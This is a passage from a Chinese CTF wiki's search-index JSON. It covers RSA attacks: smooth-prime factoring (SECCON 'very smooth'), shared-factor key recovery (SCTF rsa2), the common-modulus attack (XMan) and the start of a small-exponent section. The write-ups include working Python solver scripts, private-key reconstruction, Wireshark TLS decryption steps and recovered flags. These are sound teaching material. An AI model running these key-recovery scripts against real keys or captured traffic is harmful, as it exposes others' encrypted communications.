            "text": "\u8be5\u7a0b\u5e8f\u7ed9\u4e86\u4e00\u4e2a HTTPS \u52a0\u5bc6\u7684\u6d41\u91cf\u5305\uff0c\u9996\u5148\u4ece\u5176\u4e2d\u62ff\u5230\u8bc1\u4e66  \u279c  2017_SECCON_verysmooth git: ( master )  binwalk -e s.pcap      \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n-------------------------------------------------------------------------------- 2292           0x8F4           Certificate in DER format  ( x509 v3 ) , header length:  4 , sequence length:  467  4038           0xFC6           Certificate in DER format  ( x509 v3 ) , header length:  4 , sequence length:  467  5541           0x15A5          Certificate in DER format  ( x509 v3 ) , header length:  4 , sequence length:  467 \n\n\u279c  2017_SECCON_verysmooth git: ( master )  ls\ns.pcap  _s.pcap.extracted  very_smooth.zip  \u8fd9\u91cc\u5206\u522b\u67e5\u770b\u4e09\u4e2a\u8bc1\u4e66\uff0c\u4e09\u4e2a\u6a21\u6570\u90fd\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u4f8b\u5b50  \u279c  _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt  -pubkey -text -modulus -noout \n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy\n8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj\nDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl\nyioxCqbXYIMxGO4NcQIDAQAB\n-----END PUBLIC KEY-----\nCertificate:\n    Data:\n        Version: 1 (0x0)\n        Serial Number: 11640506567126718943 (0xa18b630c7b3099df)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=JP, ST=Kawasaki, O=SRL\n        Validity\n            Not Before: Oct  8 02:47:17 2017 GMT\n            Not After : Oct  8 02:47:17 2018 GMT\n        Subject: C=JP, ST=Kawasaki, O=SRL\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                Public-Key: (1024 bit)\n                Modulus:\n                    00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe:\n                    48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0:\n                    c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12:\n                    75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e:\n                    69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0:\n                    2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07:\n                    47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89:\n                    19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a:\n                    a6:d7:60:83:31:18:ee:0d:71\n                Exponent: 65537 (0x10001)\n    Signature Algorithm: sha256WithRSAEncryption\n         78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf:\n         62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3:\n         32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46:\n         f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c:\n         6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96:\n         bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05:\n         e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32:\n         b7:39\nModulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71  \u53ef\u4ee5\u770b\u51fa\u6a21\u6570\u53ea\u6709 1024 \u6bd4\u7279\u3002\u800c\u4e14\uff0c\u6839\u636e\u9898\u76ee\u540d very smooth\uff0c\u5e94\u8be5\u662f\u5176\u4e2d\u4e00\u4e2a\u56e0\u5b50\u6bd4\u8f83 smooth\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528 primefac \u5206\u522b\u5c1d\u8bd5 Pollard's p \u2212 1 \u4e0e Williams's p + 1 \u7b97\u6cd5\uff0c\u5982\u4e0b  \u279c  _s.pcap.extracted git: ( master )  python -m primefac -vs -m = p+1   149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897  149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 : p+1  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001   12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897  Z309    =   P155 x  P155    =    11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001  x  12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897   \u53ef\u4ee5\u53d1\u73b0\u5f53\u4f7f\u7528 Williams's  p  + 1 \u7b97\u6cd5\u65f6\uff0c\u5c31\u76f4\u63a5\u5206\u89e3\u51fa\u6765\u4e86\u3002\u6309\u9053\u7406\u8fd9\u4e2a\u56e0\u5b50\u662f p-1 \u4f3c\u4e4e\u66f4\u5149\u6ed1\uff0c\u4f46\u662f\u5374\u5e76\u4e0d\u80fd\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u5206\u89e3\uff0c\u8fd9\u91cc\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5  \u279c  _s.pcap.extracted git: ( master )  python -m primefac -vsx P1 x P2 x P3 x P6 x  P142    =    2  x  7  x  43  x  503  x  761429  x  5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 \n\n\u279c  _s.pcap.extracted git: ( master )  python -m primefac -vs  1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000   1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 :  2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   2   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   3   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5   5  Z154    =   P1^185 x P1^62 x P1^97   =    2 ^185 x  3 ^62 x  5 ^97  \u53ef\u4ee5\u770b\u51fa\uff0c\u5bf9\u4e8e p-1 \u786e\u5b9e\u6709\u5f88\u591a\u5c0f\u56e0\u5b50\uff0c\u4f46\u662f\u4e2a\u6570\u592a\u591a\uff0c\u8fd9\u5c31\u4f1a\u4f7f\u5f97\u8fdb\u884c\u679a\u4e3e\u7684\u65f6\u5019\u51fa\u73b0\u6307\u6570\u7206\u70b8\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6ca1\u6709\u5206\u89e3\u51fa\u6765\u3002  \u8fdb\u800c\u6839\u636e\u5206\u89e3\u51fa\u6765\u7684\u6570\u6784\u9020\u79c1\u94a5  from   Crypto.PublicKey   import   RSA  import   gmpy2  def   main (): \n     n   =   149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L \n     p   =   11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L \n     q   =   12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L \n     e   =   65537L \n     priv   =   RSA . construct (( n ,   e ,   long ( gmpy2 . invert ( e ,   ( p   -   1 )   *   ( q   -   1 ))))) \n     open ( private.pem ,   w ) . write ( priv . exportKey ( PEM ))  main ()   \u6700\u540e\uff0c\u5c06\u79c1\u94a5\u5bfc\u5165\u5230 wireshark \u4e2d\u5373\u53ef\u5f97\u5230\u660e\u6587\uff08Edit -  Preferences -  Protocols -  SSL -  RSA Key List\uff09\u3002  html  head title Very smooth / title / head  body  h1 \nAnswer: One of these primes is very smooth. / h1  / body  / html", 
            "title": "2017 SECCON very smooth"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_3", 
            "text": "\u5173\u4e8e\u66f4\u591a\u7684\u4e00\u4e9b\u5206\u89e3\u6a21\u6570 N \u7684\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003  https://en.wikipedia.org/wiki/Integer_factorization \u3002", 
            "title": "\u6269\u5c55"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_4", 
            "text": "", 
            "title": "\u6a21\u4e0d\u4e92\u7d20"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_5", 
            "text": "\u5f53\u5b58\u5728\u4e24\u4e2a\u516c\u94a5\u7684 N \u4e0d\u4e92\u7d20\u65f6\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e24\u4e2a\u6570\u6c42\u6700\u5927\u516c\u56e0\u6570\uff0c\u7136\u540e\u76f4\u63a5\u83b7\u5f97 p\uff0cq\uff0c\u8fdb\u800c\u83b7\u5f97\u76f8\u5e94\u7684\u79c1\u94a5\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#sctf-rsa2", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF rsa2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u76f4\u63a5\u6253\u5f00 pcap \u5305\uff0c\u53d1\u73b0\u6709\u4e00\u5806\u7684\u6d88\u606f\uff0c\u5305\u542b N \u548c e\uff0c\u7136\u540e\u8bd5\u4e86\u8bd5\u4e0d\u540c\u7684 N \u662f\u5426\u4e92\u7d20\uff0c\u6211\u8bd5\u4e86\u524d\u4e24\u4e2a  import   gmpy2  n1   =   20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031  n2   =   19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943  print   gmpy2 . gcd ( n1 ,   n2 )   \u7ed3\u679c\u53d1\u73b0\u7adf\u7136\u4e0d\u4e92\u7d20\u3002  \u279c  scaf-rsa2 git: ( master )  \u2717 python exp.py 122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137   \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6765\u89e3\u5bc6\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7b2c\u4e00\u5bf9\u516c\u94a5\u5bc6\u7801\u3002\u4ee3\u7801\u5982\u4e0b  from   Crypto.PublicKey   import   RSA  from   Crypto.Cipher   import   PKCS1_v1_5 ,   PKCS1_OAEP  import   gmpy2  from   base64   import   b64decode  n1   =   20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031  n2   =   19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943  p1   =   gmpy2 . gcd ( n1 ,   n2 )  q1   =   n1   /   p1  e   =   65537  phin   =   ( p1   -   1 )   *   ( q1   -   1 )  d   =   gmpy2 . invert ( e ,   phin )  cipher   =   0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7  plain   =   gmpy2 . powmod ( cipher ,   d ,   n1 )  plain   =   hex ( plain )[ 2 :]  if   len ( plain )   %   2   !=   0 : \n     plain   =   0   +   plain  print   plain . decode ( hex )   \u6700\u540e\u89e3\u5bc6\u5982\u4e0b  \u279c  scaf-rsa2 git: ( master )  \u2717 python exp.py       \nsH1R3_PRlME_1N_rsA_iS_4ulnEra5le  \u89e3\u538b\u538b\u7f29\u5305\u5373\u53ef\u3002", 
            "title": "SCTF RSA2"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_6", 
            "text": "", 
            "title": "\u5171\u6a21\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_7", 
            "text": "\u5f53\u4e24\u4e2a\u7528\u6237\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570 N\u3001\u4e0d\u540c\u7684\u79c1\u94a5\u65f6\uff0c\u52a0\u5bc6\u540c\u4e00\u660e\u6587\u6d88\u606f\u65f6\u5373\u5b58\u5728\u5171\u6a21\u653b\u51fb\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_8", 
            "text": "\u8bbe\u4e24\u4e2a\u7528\u6237\u7684\u516c\u94a5\u5206\u522b\u4e3a  e_1 e_1  \u548c  e_2 e_2 \uff0c\u4e14\u4e24\u8005\u4e92\u8d28\u3002\u660e\u6587\u6d88\u606f\u4e3a  m m \uff0c\u5bc6\u6587\u5206\u522b\u4e3a\uff1a   \nc_1 = m^{e_1}\\bmod N \\\\\nc_2 = m^{e_2}\\bmod N  \nc_1 = m^{e_1}\\bmod N \\\\\nc_2 = m^{e_2}\\bmod N   \u5f53\u653b\u51fb\u8005\u622a\u83b7  c_1 c_1  \u548c  c_2 c_2  \u540e\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u51fa\u660e\u6587\u3002\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u51fa  re_1+se_2=1\\bmod n re_1+se_2=1\\bmod n  \u7684\u4e24\u4e2a\u6574\u6570  r r  \u548c  s s \uff0c\u7531\u6b64\u53ef\u5f97\uff1a   \n\\begin{align*}\nc_{1}^{r}c_{2}^{s}  \\equiv m^{re_1}m^{se_2}\\bmod n\\\\ \\equiv m^{(re_1+se_2)} \\bmod n\\\\ \\equiv m\\bmod n\n\\end{align*}  \n\\begin{align*}\nc_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\\n&\\equiv m^{(re_1+se_2)} \\bmod n\\\\\n&\\equiv m\\bmod n\n\\end{align*}", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#xman", 
            "text": "\u9898\u76ee\u63cf\u8ff0\uff1a  {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773}\n\n{6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839}\n\nmessage1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349\n\nmessage2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535   \u9898\u76ee\u6765\u6e90\uff1aXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60    \u53ef\u4ee5\u770b\u51fa\u4e24\u4e2a\u516c\u94a5\u7684 N \u662f\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u4e24\u8005\u7684 e \u4e92\u7d20\u3002\u5199\u4e00\u4e2a\u811a\u672c\u8dd1\u4e00\u4e0b\uff1a  import   gmpy2  n   =   6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249  e1   =   773  e2   =   839  message1   =   3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349  message2   =   5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535  # s   t  gcd ,   s ,   t   =   gmpy2 . gcdext ( e1 ,   e2 )  if   s     0 : \n     s   =   - s \n     message1   =   gmpy2 . invert ( message1 ,   n )  if   t     0 : \n     t   =   - t \n     message2   =   gmpy2 . invert ( message2 ,   n )  plain   =   gmpy2 . powmod ( message1 ,   s ,   n )   *   gmpy2 . powmod ( message2 ,   t ,   n )   %   n  print   plain   \u5f97\u5230  \u279c  Xman-1-class-exercise git: ( master )  \u2717 python exp.py 1021089710312311910410111011910111610410511010710511610511511211111511510598108101125   \u8fd9\u65f6\u5019\u9700\u8981\u8003\u8651\u5f53\u65f6\u660e\u6587\u662f\u5982\u4f55\u8f6c\u5316\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u662f 16 \u8fdb\u5236\u8f6c\u6362\uff0cASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u6216\u8005 Base64 \u89e3\u5bc6\u3002\u8fd9\u4e2a\u5e94\u8be5\u662f ASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u8fdb\u800c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u5f97\u5230 flag  i   =   0  flag   =    plain   =   str ( plain )  while   i     len ( plain ): \n     if   plain [ i ]   ==   1 : \n         flag   +=   chr ( int ( plain [ i : i   +   3 ])) \n         i   +=   3 \n     else : \n         flag   +=   chr ( int ( plain [ i : i   +   2 ])) \n         i   +=   2  print   flag   \u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f7f\u7528 1 \u6765\u5224\u65ad\u662f\u5426\u4e3a\u4e09\u4f4d\u957f\u5ea6\uff0c\u662f\u56e0\u4e3a flag \u4e00\u822c\u90fd\u662f\u660e\u6587\u5b57\u7b26\uff0c\u800c 1 \u5f00\u5934\u7684\u957f\u5ea6\u4e3a 1 \u6216\u8005 2 \u7684\u6570\u5b57\uff0c\u4e00\u822c\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\u3002  flag  \u279c  Xman-1-class-exercise git: ( master )  \u2717 python exp.py\nflag { whenwethinkitispossible }", 
            "title": "XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/#_9", 
            "text": "Jarvis OJ very hard RSA", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/", 
            "text": "\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\ne \u7279\u522b\u5c0f\uff0c\u6bd4\u5982 e \u4e3a 3\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u5047\u8bbe\u7528\u6237\u4f7f\u7528\u7684\u5bc6\u94a5 \ne=3\ne=3\n\u3002\u8003\u8651\u5230\u52a0\u5bc6\u5173\u7cfb\u6ee1\u8db3\uff1a\n\n\n\n\n\nc\\equiv m^3 \\bmod N\n\n\n\n\nc\\equiv m^3 \\bmod N\n\n\n\n\n\n\u5219\uff1a\n\n\n\n\n\n\\begin{align*}\nm^3 \n= c+k\\times N\\\\\nm \n= \\sqrt[3]{c+k\\times n}\n\\end{align*}\n\n\n\n\n\\begin{align*}\nm^3 &= c+k\\times N\\\\\nm &= \\sqrt[3]{c+k\\times n}\n\\end{align*}\n\n\n\n\n\n\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5c0f\u5230\u5927\u679a\u4e3e \nN\nN\n\uff0c\u4f9d\u6b21\u5f00\u4e09\u6b21\u6839\uff0c\u76f4\u5230\u5f00\u51fa\u6574\u6570\u4e3a\u6b62\u3002\n\n\n\u8303\u4f8b\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\uff0c\u9644\u4ef6\u4e2d\u6709\u4e00\u4e2a \nflag.enc\n \u548c \npubkey.pem\n\uff0c\u5f88\u660e\u663e\u662f\u5bc6\u6587\u548c\u516c\u94a5\u4e86\uff0c\u5148\u7528 \nopenssl\n \u8bfb\u4e00\u4e0b\u516c\u94a5\u3002\n\n\n\u279c  Jarvis OJ-Extremely hard RSA git:\n(\nmaster\n)\n \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus       \nPublic-Key: \n(\n4096\n bit\n)\n\nModulus:\n    \n00\n:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6:\n    \n18\n:fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98:\n    de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56:\n    \n56\n:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65:\n    db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0:\n    d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c:\n    \n97\n:73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab:\n    ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2:\n    \n05\n:68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef:\n    \n80\n:01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49:\n    \n10\n:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15:\n    \n79\n:c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70:\n    eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18:\n    \n83\n:af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f:\n    ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24:\n    \n13\n:11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6:\n    ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0:\n    \n45\n:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca:\n    d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86:\n    \n02\n:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc:\n    dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8:\n    c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56:\n    f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9:\n    a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5:\n    c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4:\n    5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2:\n    \n08\n:d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7:\n    fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a:\n    \n97\n:94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d:\n    ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9:\n    2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a:\n    1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b:\n    \n98\n:03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77:\n    0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3:\n    0b:39:29\nExponent: \n3\n \n(\n0x3\n)\n\n\nModulus\n=\nB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY\n/Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs\npA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff\n0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON\nRjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg\nCw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF\nie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG\ngJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl\nUitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE\nJvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC\nLvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP\n\nEkP0OHRGzM6yIiqWXMMLOSkCAQM\n=\n\n-----END PUBLIC KEY-----\n\n\n\n\n\u770b\u5230 